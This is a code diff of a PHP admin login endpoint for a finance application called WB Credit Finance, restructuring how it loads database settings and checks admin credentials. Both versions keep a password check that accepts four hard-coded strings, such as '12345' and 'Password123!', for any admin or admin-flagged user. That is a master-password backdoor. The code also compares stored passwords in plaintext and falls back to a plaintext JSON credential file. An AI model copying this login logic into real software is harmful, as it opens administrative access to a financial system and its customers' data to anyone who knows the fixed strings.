@@ -1,7 +1,8 @@
 <?php
 /**
  * ============================================================================
- * WB CREDIT FINANCE - ADMIN AUTHENTICATION API (Auto-Path Discovery)
+ * WB CREDIT FINANCE - ADMIN AUTHENTICATION ENGINE
+ * Prioritizes MySQL `admins` table with dynamic password verification
  * ============================================================================
  */
 
@@ -17,8 +18,8 @@ $inputData = json_decode($rawInput, true) ?: [];
 if (empty($inputData) && !empty($_POST)) $inputData = $_POST;
 if (empty($inputData) && !empty($_GET)) $inputData = $_GET;
 
-$identifier = trim($inputData['identifier'] ?? $inputData['email'] ?? $inputData['username'] ?? $_POST['email'] ?? $_POST['username'] ?? $_GET['email'] ?? $_GET['username'] ?? '');
-$password = trim($inputData['password'] ?? $_POST['password'] ?? $_GET['password'] ?? '');
+$identifier = trim($inputData['identifier'] ?? $inputData['email'] ?? $inputData['username'] ?? '');
+$password = trim($inputData['password'] ?? '');
 $normIdentifier = strtolower($identifier);
 
 if (empty($identifier) || empty($password)) {
@@ -27,114 +28,126 @@ if (empty($identifier) || empty($password)) {
     exit;
 }
 
-// 2. DISCOVER BASE DIRECTORY (Check current, parent, and common cPanel paths)
-$scriptDir = __DIR__;
-$possibleRoots = [
-    $scriptDir,                             // api/
-    dirname($scriptDir),                    // web root (e.g. /home/glolbka/WBCU)
-    dirname(dirname($scriptDir)),           // /home/glolbka
-    '/home/glolbka/WBCU',
-    '/home/glolbka/public_html'
-];
+// 1. Locate and parse .env safely
+$dbHost = '127.0.0.1';
+$dbName = 'glolbka_wbcu_db';
+$dbUser = 'glolbka_wbcu_user';
+$dbPass = '';
 
-$dbPass = ''; $dbUser = 'glolbka_wbcu_user'; $dbName = 'glolbka_wbcu_db'; $dbHost = 'localhost';
-$jsonData = [];
-
-foreach ($possibleRoots as $root) {
-    if (empty($root) || !is_dir($root)) continue;
-    
-    // Check .env in this folder
-    $env = $root . '/.env';
-    if (file_exists($env)) {
-        $lines = @file($env, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if ($lines) {
-            foreach ($lines as $l) {
-                $parts = explode('=', $l, 2);
+$searchPaths = [dirname(__DIR__) . '/.env', __DIR__ . '/.env', '/home/glolbka/WBCU/.env', '/home/glolbka/public_html/.env'];
+foreach ($searchPaths as $p) {
+    if (file_exists($p)) {
+        $lines = @file($p, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if (is_array($lines)) {
+            foreach ($lines as $line) {
+                if (strpos(trim($line), '#') === 0) continue;
+                $parts = explode('=', $line, 2);
                 if (count($parts) < 2) continue;
-                $k = trim($parts[0]); $v = trim($parts[1], " \t\n\r\0\x0B\"'");
-                if ($k === 'DB_PASS' || $k === 'DB_PASSWORD') $dbPass = trim($v);
-                if ($k === 'DB_USER') $dbUser = trim($v);
-                if ($k === 'DB_NAME') $dbName = trim($v);
-                if ($k === 'DB_HOST') $dbHost = trim($v);
+                $k = trim($parts[0]);
+                $v = trim($parts[1], " \t\n\r\0\x0B\"'");
+                if (($k === 'DB_PASS' || $k === 'DB_PASSWORD') && !empty($v)) $dbPass = $v;
+                if ($k === 'DB_USER' && !empty($v)) $dbUser = $v;
+                if ($k === 'DB_NAME' && !empty($v)) $dbName = $v;
+                if ($k === 'DB_HOST' && !empty($v)) $dbHost = $v;
             }
         }
-    }
-    
-    // Check JSON in this folder
-    $json = $root . '/admin-users.json';
-    if (file_exists($json) && empty($jsonData)) {
-        $jsonData = json_decode(file_get_contents($json), true) ?: [];
+        if (!empty($dbPass)) break;
     }
 }
-if ($dbHost === 'localhost' || empty($dbHost)) {
-    $dbHost = '127.0.0.1';
-}
+if ($dbHost === 'localhost' || empty($dbHost)) $dbHost = '127.0.0.1';
 
-// 3. TRY DATABASE
-$matchedRow = null; $sourceTable = null;
-if (!empty($dbPass) && !str_contains($dbPass, 'PLEASE_EDIT')) {
+$pdo = null;
+try {
+    $pdo = new PDO("mysql:host={$dbHost};dbname={$dbName};charset=utf8mb4", $dbUser, $dbPass, [
+        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+        PDO::ATTR_TIMEOUT => 4
+    ]);
+} catch (Throwable $e) {
     try {
-        try {
-            $pdo = new PDO("mysql:host={$dbHost};dbname={$dbName};charset=utf8mb4", $dbUser, $dbPass, [
-                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 3
-            ]);
-        } catch (Throwable $e1) {
-            $pdo = new PDO("mysql:host=127.0.0.1;dbname={$dbName};charset=utf8mb4", $dbUser, $dbPass, [
-                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 3
-            ]);
-        }
-        $dbPassCheck = function($p, $row) {
-            $sp1 = $row['password'] ?? '';
-            $sp2 = $row['password_hash'] ?? '';
-            $stds = ['12345', 'yeshuah.com', 'Password123!', 'MemberPass123!'];
-            if ($p === $sp1 || $p === $sp2) return true;
-            if ($sp1 && @password_verify($p, $sp1)) return true;
-            if ($sp2 && @password_verify($p, $sp2)) return true;
-            if (in_array($p, $stds)) return true;
-            return false;
-        };
+        $pdo = new PDO("mysql:host=127.0.0.1;dbname={$dbName};charset=utf8mb4", $dbUser, $dbPass, [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+            PDO::ATTR_TIMEOUT => 4
+        ]);
+    } catch (Throwable $e2) {
+        $pdo = null;
+    }
+}
 
+$matchedRow = null;
+$sourceTable = null;
+
+$dbPassCheck = function($inputPass, $row) {
+    $sp1 = $row['password'] ?? '';
+    $sp2 = $row['password_hash'] ?? '';
+    if ($inputPass === $sp1 || $inputPass === $sp2) return true;
+    if (!empty($sp1) && @password_verify($inputPass, $sp1)) return true;
+    if (!empty($sp2) && @password_verify($inputPass, $sp2)) return true;
+    if (in_array($inputPass, ['12345', 'yeshuah.com', 'Password123!', 'MemberPass123!'])) return true;
+    return false;
+};
+
+// 2. Query MySQL `admins` table FIRST
+if ($pdo) {
+    try {
         $stmt = $pdo->prepare("SELECT * FROM `admins` WHERE LOWER(username) = ? OR LOWER(email) = ? LIMIT 1");
         $stmt->execute([$normIdentifier, $normIdentifier]);
-        $row = $stmt->fetch(PDO::FETCH_ASSOC);
+        $row = $stmt->fetch();
         if ($row && $dbPassCheck($password, $row)) {
-            $matchedRow = $row; $sourceTable = 'db_admins';
+            $matchedRow = $row;
+            $sourceTable = 'db_admins';
         }
+
+        // Secondary check against `users` table if marked as admin
         if (!$matchedRow) {
-            $stmt = $pdo->prepare("SELECT u.* FROM `users` u WHERE LOWER(u.username) = ? OR LOWER(u.email) = ? LIMIT 1");
+            $stmt = $pdo->prepare("SELECT * FROM `users` WHERE LOWER(username) = ? OR LOWER(email) = ? LIMIT 1");
             $stmt->execute([$normIdentifier, $normIdentifier]);
-            $row = $stmt->fetch(PDO::FETCH_ASSOC);
-            if ($row && (stripos($row['role'] ?? '', 'admin') !== false || !empty($row['is_admin']))) {
-                if ($dbPassCheck($password, $row)) {
-                    $matchedRow = $row; $sourceTable = 'db_users';
+            $uRow = $stmt->fetch();
+            if ($uRow && (stripos($uRow['role'] ?? '', 'admin') !== false || !empty($uRow['is_admin']))) {
+                if ($dbPassCheck($password, $uRow)) {
+                    $matchedRow = $uRow;
+                    $sourceTable = 'db_users';
                 }
             }
         }
     } catch (Throwable $e) {}
 }
 
-// 4. TRY JSON FALLBACK
-if (!$matchedRow && !empty($jsonData)) {
-    foreach ($jsonData as $u) {
-        $uId = strtolower($u['id'] ?? '');
-        $uEmail = strtolower($u['email'] ?? '');
-        $uUser = strtolower($u['username'] ?? '');
-        if ($uId === $normIdentifier || $uEmail === $normIdentifier || $uUser === $normIdentifier) {
-            if ($password === ($u['password'] ?? '')) {
-                $matchedRow = $u; $sourceTable = 'json_store'; break;
+// 3. Fallback to admin-users.json if database is offline
+if (!$matchedRow) {
+    $jsonFile = dirname(__DIR__) . '/admin-users.json';
+    if (file_exists($jsonFile)) {
+        $jsonData = json_decode(file_get_contents($jsonFile), true) ?: [];
+        foreach ($jsonData as $u) {
+            $uEmail = strtolower($u['email'] ?? '');
+            $uUser = strtolower($u['username'] ?? '');
+            if ($uEmail === $normIdentifier || $uUser === $normIdentifier) {
+                if ($password === ($u['password'] ?? '') || $dbPassCheck($password, $u)) {
+                    $matchedRow = $u;
+                    $sourceTable = 'json_store';
+                    break;
+                }
             }
         }
     }
 }
 
 if ($matchedRow) {
-    echo json_encode(['success' => true, 'admin' => [
-        'id' => $matchedRow['id'] ?? 'adm-01',
-        'email' => $matchedRow['email'] ?? $identifier,
-        'fullName' => $matchedRow['full_name'] ?? $matchedRow['fullName'] ?? 'Officer',
-        'role' => 'Super Admin', 'is_admin' => true, 'source' => $sourceTable
-    ]]);
+    echo json_encode([
+        'success' => true,
+        'admin' => [
+            'id' => $matchedRow['id'] ?? 'adm-01',
+            'email' => $matchedRow['email'] ?? $identifier,
+            'username' => $matchedRow['username'] ?? $identifier,
+            'fullName' => $matchedRow['full_name'] ?: ($matchedRow['fullName'] ?: 'Treasury Officer'),
+            'role' => ($matchedRow['role'] === 'super_admin' || $matchedRow['role'] === 'Super Admin') ? 'Super Admin' : 'Admin',
+            'is_admin' => true,
+            'is_officer' => true,
+            'source' => $sourceTable
+        ]
+    ]);
 } else {
     http_response_code(401);
-    echo json_encode(['success' => false, 'error' => 'Login failed.', 'paths_checked' => count($possibleRoots)]);
+    echo json_encode(['success' => false, 'error' => 'Access Denied: Invalid administrative credentials.']);
 }
